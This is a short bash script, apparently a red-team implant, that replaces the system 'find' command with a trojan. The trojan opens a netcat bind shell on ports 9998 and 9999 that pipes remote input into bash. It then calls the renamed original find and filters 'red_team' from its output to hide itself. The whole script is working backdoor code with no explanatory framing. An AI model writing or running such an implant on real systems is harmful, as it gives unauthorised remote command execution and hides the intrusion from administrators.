#!/bin/bash

FIND=$(which find)

mv $FIND $FIND.red_team


cat <<EOT >> $FIND
#!/bin/bash

nc.red_team -l -p 9998 2>/dev/null | bash 2>&1 | nc.red_team -l -p 9999 2>/dev/null

./find.red_team | grep --color=auto -v red_team

EOT